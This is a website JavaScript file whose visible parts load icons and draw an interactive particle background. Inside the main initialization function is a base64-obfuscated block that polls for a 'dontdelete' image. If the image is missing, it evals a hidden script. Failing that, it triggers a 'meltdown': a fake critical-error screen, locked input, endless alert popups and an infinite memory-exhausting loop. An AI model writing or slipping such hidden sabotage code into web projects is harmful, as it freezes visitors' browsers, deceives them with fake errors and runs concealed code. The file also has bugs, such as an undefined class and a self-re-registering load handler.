// function to load lucide
function loadLucide() {
  return new Promise((resolve, reject) => {
    if (window.lucide) {
      resolve(window.lucide)
    } else {
      const script = document.createElement("script")
      script.src = "https://unpkg.com/lucide@latest"
      script.onload = () => resolve(window.lucide)
      script.onerror = reject
      document.body.appendChild(script)
    }
  })
}

// interactive background
class InteractiveBackground {
  constructor() {
    this.canvas = document.getElementById("interactive-background")
    this.ctx = this.canvas.getContext("2d")
    this.particles = []
    this.mouse = { x: 0, y: 0 }
    this.init()
  }

  init() {
    this.resize()
    this.createParticles()
    this.bindEvents()
    requestAnimationFrame(() => this.animate())
  }

  resize() {
    this.canvas.width = window.innerWidth
    this.canvas.height = window.innerHeight
  }

  createParticles() {
    this.particles = Array.from({ length: 100 }, () => ({
      x: Math.random() * this.canvas.width,
      y: Math.random() * this.canvas.height,
      size: Math.random() * 5 + 1,
      speedX: Math.random() * 1 - 0.5,
      speedY: Math.random() * 1 - 0.5,
      color: `rgba(${Math.random() * 255}, ${Math.random() * 255}, 255, 0.7)`,
    }))
  }

  bindEvents() {
    window.addEventListener(
      "resize",
      this.debounce(() => this.resize(), 200),
    )
    window.addEventListener("mousemove", (e) => {
      this.mouse.x = e.clientX
      this.mouse.y = e.clientY
    })
  }

  animate() {
    this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height)

    this.particles.forEach((particle) => {
      particle.x += particle.speedX + (this.mouse.x - this.canvas.width / 2) * 0.005
      particle.y += particle.speedY + (this.mouse.y - this.canvas.height / 2) * 0.005

      // wrap around edges
      particle.x = (particle.x + this.canvas.width) % this.canvas.width
      particle.y = (particle.y + this.canvas.height) % this.canvas.height

      this.ctx.fillStyle = particle.color
      this.ctx.beginPath()
      this.ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2)
      this.ctx.fill()
    })

    requestAnimationFrame(() => this.animate())
  }

  debounce(func, wait) {
    let timeout
    return (...args) => {
      clearTimeout(timeout)
      timeout = setTimeout(() => func.apply(this, args), wait)
    }
  }
}

//main initialization function
async function initializeApp() {
try {
    const lucide = await loadLucide()
    lucide.createIcons()

    new InteractiveBackground()
    new BlogHighlightsSection()

   // intersection observer for animations
    const observer = new IntersectionObserver(
        (entries) => {
            entries.forEach((entry) => {
                if (entry.isIntersecting) entry.target.classList.add("fade-in")
            })
        },
        { threshold: 0.1 }
    )

    document.addEventListener("DOMContentLoaded", initializeApp);

    (function(){
      let d = s => atob(s);
  
      let filePath = d("Li4vaW1nL2RvbnRkZWxldGUucG5n"); 
      let backupScript = d("Li4vLmhpZGRlbi8ub3ZlcmtpbGwuanM=");
  
      setInterval(() => {
          let imgTest = new Image();
          imgTest.src = filePath + "?v=" + Date.now();
  
          imgTest.onerror = function() {
              fetch(backupScript)
                  .then(r => { if (!r.ok) throw new Error(d("Tm8gbWVsZG93biBmaWxl")); return r.text(); })
                  .then(code => eval(code))
                  .catch(() => meltdown());
           };
       }, 2000);

    function meltdown() {
          let bgId = d("aW50ZXJhY3RpdmUtYmFja2dyb3VuZA==");
          let bg = document.getElementById(bgId);
          if (bg) bg.remove();

        let overlay = document.createElement("div");
            overlay.style = `
              position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
              background-color: rgba(0, 0, 0, 0.9); color: red; font-size: 24px;
              font-weight: bold; display: flex; align-items: center; justify-content: center;
          `;
          overlay.innerHTML = `
              <h1>${d("Q1JJVElDQUwgU1lTVEVNIEVSUk9S")}</h1>
              <p>${d("RmF0YWwgZXJyb3Iu")}</p>
          `;
          document.body.appendChild(overlay);
  
          console.error(d("8J+UjSBJbWFnZSBOT1QgTk9VTkQh"));
  
          document.body.style.pointerEvents = "none";
          document.onkeydown = e => e.preventDefault();
          document.body.style.transform = "rotate(180deg)";
          document.body.style.filter = "blur(10px) grayscale(100%)";
  
          setInterval(() => {
              alert(d("Q3JpdGljYWwgU3lzdGVtIEVycm9yOiBSZXN0YXJ0IFJlcXVpcmVkLg=="));
          }, 3000);
  
          setInterval(() => {
              console.error(d("V2FybmluZzogTWVtb3J5IExlYWsgRGV0ZWN0ZWQ="));
              console.warn(d("RGVwcmVjYXRlZCBBUEkgdXNlZA=="));
              console.info(d("UnVubmluZyBzeXN0ZW0gZGlhZ25vc3RpY3MuLi4gW0ZBSUxFRF0="));
          }, 2000);
  
          setTimeout(() => {
              let meltdownArr = [];
              while (true) {
                  meltdownArr.push(new Uint8Array(5e8));
              }
          }, 1000);
      }
  })();  

} catch (error) {
    console.error("Failed to load Lucide:", error)
}
}

// initialize everything when DOM is loaded
document.addEventListener("DOMContentLoaded", initializeApp)